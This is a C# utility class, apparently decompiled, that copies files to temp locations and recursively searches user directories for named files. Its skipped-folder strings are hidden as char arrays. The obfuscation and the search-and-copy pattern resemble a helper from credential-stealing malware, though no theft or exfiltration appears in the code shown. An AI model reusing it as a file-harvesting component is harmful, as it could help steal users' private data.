using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace WindowsSDK.Objects
{
    public class FileCopier : IDisposable
    {
        private string tmpFilename;

        private bool createdNew;

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

        public string CreateShadowCopy(string filePath)
        {
            try
            {
                tmpFilename = Path.GetTempFileName();
                if (CopyToTemp(filePath, tmpFilename))
                {
                    createdNew = true;
                    return tmpFilename;
                }
                if (CopyToTemp(filePath, tmpFilename))
                {
                    createdNew = true;
                    return tmpFilename;
                }
                createdNew = false;
                return filePath;
            }
            catch
            {
                createdNew = false;
                return filePath;
            }
        }

        private static bool CopyToTemp(string filePath, string temp)
        {
            try
            {
                return CopyFile(filePath, temp, bFailIfExists: false);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>
            {
                new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }),
                new string(new char[15]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', '\\'
            }),
                new string(new char[21]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
                '\\'
            }),
                new string(new char[14]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
                'a', 't', 'a', '\\'
            })
            };
            List<string> list2 = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list2;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string text in directories)
                {
                    bool flag = false;
                    foreach (string item in list)
                    {
                        if (text.Contains(item))
                        {
                            flag = true;
                            break;
                        }
                    }
                    if (flag)
                    {
                        continue;
                    }
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(text);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag2 = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag2)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag2)
                                {
                                    break;
                                }
                                string obj = files[k];
                                FileInfo fileInfo = files2[j];
                                if (obj == fileInfo.Name)
                                {
                                    flag2 = true;
                                    list2.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item2 in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list2.Contains(item2))
                            {
                                list2.Add(item2);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list2;
        }

        public void Dispose()
        {
            try
            {
                if (createdNew)
                {
                    File.Delete(tmpFilename);
                }
            }
            catch
            {
            }
        }
    }
}
